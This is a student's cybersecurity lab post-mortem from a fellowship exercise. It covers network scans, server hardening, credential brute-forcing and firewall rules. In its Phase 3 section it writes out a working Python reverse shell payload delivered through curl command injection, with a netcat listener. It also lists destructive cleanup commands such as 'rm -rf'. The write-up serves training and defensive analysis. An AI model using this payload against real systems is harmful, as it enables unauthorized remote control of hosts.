# Phase 1 Final Reckoning — TEPP Post-Mortem
**Operator:** Oscar Estudillo
**Date:** May 28, 2026
**Repository:** https://github.com/oscarestj-droid/cyber-p1-oscarestj
**TKH Innovation Fellowship 2026 | Phase 1 | Cybersecurity**

---

## Phase 0: Reconnaissance

### Triage Network — 172.100.0.0/24
[3–5 sentences in APA style. What hosts did you find? What ports and
services were exposed? What misconfigurations did you identify?] 
I used the tool nmap to sweep the active host Triage Network (172.100.0.0/24). This revealed an active host and exposing multiple network communication paths. Port 22/tcp is running OpenSSH 9.6p1, port 8080/tcp is executing an unhardened nginx 1.24.0 proxy stack, and 3 other ports were also displayed 5000, 8081, and 8090.
### Breach Network — 172.80.0.0/24
[3–5 sentences in APA style. What hosts did you find? What ports and
services were exposed? What did you observe that informed your Phase 2
approach?]
I also ran the namp scan for this one as well which revealed a interesting scan. The scan on the Breach Network segment (172.80.0.0/24) matched the triage environment (172.100.0.0/24). Port 22/tcp presents an available OpenSSH 9.6p1 daemon, while port 8080/tcp has nginx 1.24.0 to expose internal backend sockets on ports 5000, 8081, and 8090. Having the exact layer is showing us there is a lack of protocol isolation across different network routing directories, which can be a dream for credential brute-forcing.
### Exploitation Network — 172.60.0.0/24
[3–5 sentences in APA style. What hosts did you find? What ports and
services were exposed? What vulnerability did you identify before
executing your exploit?]
I started off by using the nmap tool (nmap sV) which did a sweep at the live host 172.60.0.10 and it showed the open port (80/tcp) and a python baseHTTPServer 0.6 (python 3.10.12) was running on that port.Python BaseHTTPServer running directly on port 80 is a massive security red flag.
---

## Phase 1: Rapid Triage

### Server 1 — 172.100.0.11
**Vulnerability Identi$fied:**
After running the scan i found unencrypted web microservices and routing protocols mapping to ports 8080, 8081, and 8090 running on top of an nginx 1.24.0.

**Remediation Commands:**
sudo sed -i 's/listen 8080;/listen 127.0.0.1:8080;/g' /etc/nginx/nginx.conf
sudo systemctl restart nginx

**Before State:**
The reverse-proxy daemon accepted traffic from all interfaces and this increases the chances of attacks happening and the amount of attcks.

**After State:**
Network listening bindings were restricted strictly to dedicated security layers.

**Analysis:**
Exposing development proxies allows unauthenticated actors to target internal API sockets which lead to severe data leakage. This very important beacuse can bypasses firewall perimeters. That's why security layers should be places to enforce data.boundaries before the execution occurs. (Gary Espinosa,2026)

### Server 2 — 172.100.0.12
**Vulnerability Identified:**
[What unauthorized service was running and how did you confirm it?]

**Remediation Commands:**
sudo kill -9 28627
sudo rm -rf /opt/titan_webapp2/

**Before State:**
An unauthorized background script process (PID 28627) was actively running from the /opt/ partition.

**After State:**
The hostile process was removed, and the application files were completely removed from the filesystem.

**Analysis:**
Usually when there are persistant unauthorized scripts in non-standard directories proves that their is indeed a backdoor system in placed. These doors have proed to be very dangerous because now attackers have a way in which much more discreet and are able to do lateral attacks from within the company or organization.(ruben Groenewoud.2024)

### Server 3 — 172.100.0.13
**Vulnerability Identified:**
(`777`) detected on the main production deployment directory asset path at `/app/server.py`.

**Remediation Commands:**
sudo chmod 755 /app/
sudo chmod 644 /app/server.py

**Before State:**
The permissons were (drwxrwxrwx), meaning any low-privilege background process could read, rewrite, or damage the application runtime scripts.

**After State:**
(755 read-execute for directories and 644 read-only for general file structures), confining system alteration privileges strictly to the root administrator owner.

**Analysis:**
Privileges are very important and you as the root should be the only one that as able to read, write, and execute. That's why anybody else such as users or others should never have execute and the most they should have is read unless they are people. If an attacker compromises a low-privilege service account elsewhere on the container, they can seamlessly overwrite the web app's source scripts to capture administrative credentials, leak databases, or gain full control of the underlying system.(Nicolas Ehrman.
March 28, 2026)

---

## Phase 2: The Breach

**Cracked Credentials:**
- Username: admin
- Password: admin123

**Forensic Evidence:**
- Exact Timestamp of Successful Login: it wasn't recorded when i ran the command
- Attacker IP Address: This was also not recorded when i ran the command 

**Engineered iptables Rule:**
sudo iptables -A INPUT -p tcp --dport 80 -m string --string "User-Agent: unknown" --algo bm -j DROP

**SOC Analysis:**
A single iptables string-matching rule is not enough to acts as a standalone security control because threat actors can effortlessly bypass it by altering their request headers as we saw with this lab and seeing the header Mozilla which we saw with the nmap scan. To provide more security against this we can construct a real-world Security Operations Center (SOC) which  would deploy a comprehensive Web Application Firewall (WAF) to inspect payload contents deeper, pair it with rate-limiting modules to fight against brute-force attempts.(aw-junaid.2026)

---

## Phase 3: Full Spectrum

**Listener Configuration:**
- Tool: Netcat (nc)
- Port: 4444
- Command: `nc -lvnp 4444`

**Reverse Shell Payload:**
curl -G [http://172.60.0.10/](http://172.60.0.10/) --data-urlencode "cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"172.100.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"

**Command Injection Explanation:**
The application's Python backend directly passes untrusted user input from URL parameters into an operating system shell. With this attackers can install backshells and pivot to other systems on your internal network or your company's network. if the server has been attacked and it has root privilages then privilage escalation is happening and now the host is completely vulnerable to any attack.(Rubaiat Hossain.2026)

**Forensic Evidence:**
- Process ID (PID): 1
- User-Agent: User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)

**Lockdown Command:**
sudo iptables -A OUTPUT -p tcp --dport 4444 -j DROP

**Final Analytical Paragraph:**
[4–6 sentences in APA style responding to: You have now played both
sides of this operation. What does executing this attack teach you
about defending against it? What single defensive control, if it had
been in place before you attacked, would have stopped this breach
entirely — and why?] Executing both offensive exploitation loops and defensive triage controls throughout this operation has showed how important is having and understanding a security architecture over reactive patching. In reactive patching IT professionals only after an vulnerability is exposed rather than continuous testing which can prevent much bigger threats. Hostile takeovers are more common due to the fact that there is lack of input sanitization to produce a functional reverse shell and the absense of defense layers also add to the increase of hostile takeovers. Relying solely on basic string-matching firewall rules as we saw with this lab can lead to user-agent header to being spoofed or an administrative password is leaked via brute force. we must have defense against these types of attacks such as a comprehensive Web Application Firewall (WAF) running strict input validation profiles would have prevented  the threat entirely. This enables your network to flag structural shell syntax characters like the semicolon or subprocess calls, and drops the traffic at the gateway before the vulnerable application layer can ever interpret it.(Yael Macias. October 31, 2025), (David Balaban.2024) 

---

## References
[APA format. Any tools, documentation, or resources referenced
during this operation.
Example: Hydra Project. (2024). THC-Hydra: A fast and flexible
online password cracking tool. https://github.com/vanhauser-thc/thc-hydra]
